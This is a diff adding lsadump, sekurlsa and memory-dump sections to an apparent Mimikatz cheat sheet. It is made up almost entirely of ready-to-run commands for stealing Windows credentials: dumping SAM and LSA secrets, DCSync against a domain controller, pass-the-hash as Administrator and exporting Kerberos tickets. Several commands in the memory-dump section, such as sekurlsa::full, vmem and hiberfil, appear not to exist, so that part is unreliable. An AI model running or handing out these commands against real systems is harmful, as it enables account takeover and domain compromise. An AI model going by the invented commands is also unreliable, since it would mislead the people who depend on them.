@@ -249,3 +249,218 @@ OR
 #### Purges all tickets of the current session
 
        kerberos::purge 
+
+## Lsadump
+
+#### Interact with LSA and SAM databases. It can extract password hashes, secrets and cached credentials.
+
+### PREREQUISITES:
+
+#### 1) Ensure you have the necessary privileges to run these commands, especially for sensitive operations.
+
+#### 2) Backup your data before performing offline operations.
+
+1) SAM
+
+#### The sam command dumps the Security Account Manager (SAM) database. It contains NTLM and sometimes LM hashes of user passwords. The command can operate on both online and offline mode.
+
+ONLINE MODE
+
+### Requirements: SYSTEM privileges
+
+       privilege::debug
+
+       token::whoami
+
+       token::elevate
+
+Dump SAM
+
+       lsadump::sam 
+
+OFFLINE MODE
+
+### Requirements: SYSTEM privileges and SAM hive files.
+
+Backing up Hive files
+
+       reg save HKLM\SYSTEM systembkup.hiv
+
+       reg save HKLM\SAM sambkup.hiv
+
+OR use Volume Shadow Copy or BootCD to backup these files
+
+       C:\Windows\System32\config\SYSTEM
+       C:\Windows\System32\config\SAM
+
+Dump the hive files' content
+
+       lsadump::sam /system:systembkup.hiv /sam:sambkup.hiv
+
+2) Secrets
+
+#### The secrets command extracts LSA secrets, which may contain sensitive information such as service account passwords.
+
+Dump LSA (Service account passwords)
+
+       lsadump::secrets
+
+3) Cache
+
+#### The cache command dumps cached domain credentials stored in LSA
+
+Dump cached domain credentials
+
+       lsadump::cache
+
+4) LSA
+
+#### The lsa command interacts with the LSA database to dump user information, including NTLM and Kerberos tickets.
+
+Example 1 (Admin info):
+
+       lsadump::lsa /id:500
+
+Example 2 (Inject)
+
+       lsadump::lsa /inject /name:krbtgt
+
+Example 3 (Patch)
+
+       lsadump::lsa /patch
+
+5) Dcsync
+
+#### The dcsync command uses the DRSR protocol to synchronize a specified entry from a domain controller, effeectively simulating the behavior of domain controllers during replication.
+
+DCSync Attack
+
+       lsadump::dcsync /domain:DOMAIN.LOCAL /user:Administrator
+
+## Sekurlsa
+
+#### Extract sensitive information such as passwords, keys, PIN codes and Kerberos Tickets from the memory of the Local Security Authority Subsystem Service (LSASS) process, or from a minidump of it.
+
+### Requirements: Administrator privileges to acquire the debug priovilege via 
+
+       privilege::debug
+
+### OR SYSTEM access by any means.
+
+1) Initial setup
+
+       privilege::debug
+
+       log sekurlsa.log
+
+2) logonpasswords
+
+#### Extracts all available logon passwords
+
+       sekurlsa::logonpasswords
+
+3) Pass-the-Hash (PtH)
+
+#### Runs a process under another credential using the NTLM hash of a user's password
+
+       sekurlsa::pth /user:Administrator /domain:DOMAIN.LOCAL /ntlm:NTLM_HASH
+
+4) Tickets
+
+#### Lists and exports Kerberos tickets of all sessions
+
+       sekurlsa::tickets /export
+
+5) Ekeys
+
+#### Extracts encryption keys
+
+       sekurlsa::ekeys
+
+6) DPAPI
+
+#### Extracts DPAPI keys
+
+       sekurlsa::dpapi
+
+7) Minidump
+
+#### Loads a minidump for offline analysis
+
+       sekurlsa::minidump lsass.dmp
+
+##### 1) process = Switches the process context
+
+##### 2) searchpasswords = Searches for passwords in memory
+
+##### 3) msv = Lists MSV credentials
+
+##### 4) wdigest = Lists WDigest credentials
+
+##### 5) kerberos = Lists Kerberos credentials
+
+Example of extracting logon passwords from a minidump:
+
+       sekurlsa::minidump lsass.dmp
+
+       sekurlsa::logonpasswords
+
+### TIP: Starting with Windows 8.x and 10, passwords are NOT stored in memory by default. However, there are exceptions such as when the DC is unreachable or specific registry settings are configured to store credentials.
+
+## Memory dump
+
+### Dumps details of authentication session and associated credentials.
+
+#### Memory dump formats:
+
+##### 1) Minidump
+
+##### 2) Full Dump
+
+##### 3) Crashdump
+
+##### 4) VMem and Other Raw Formats
+
+##### 5) Hibernation File (hiberfil.sys)
+
+### Each of these formats contains memory snapshots that can be analyzed to extract sensitive information such as passwords, keys, PIN code and tickets.
+
+1) Minidump
+
+       sekurlsa::minidump lsass.dmp
+
+After loading the minidump, extract logon passwords
+
+       sekurlsa::logonpasswords
+
+2) Full Dump
+
+       sekurlsa::full fulldump.dmp
+
+Extract logon passwords
+
+       sekurlsa::logonpasswords
+
+3) Crashdump
+
+       sekurlsa::crashdump crashdump.dmp
+
+Then
+
+       sekurlsa::logonpasswords
+
+4) VMem and Other Raw Formats
+
+       sekurlsa::vmem vmemdump.vmem
+
+Then
+
+       sekurlsa::logonpasswords
+
+5) Hibernation File
+
+       sekurlsa::hiberfil hiberfil.sys
+
+Then
+
+       sekurlsa::logonpasswords
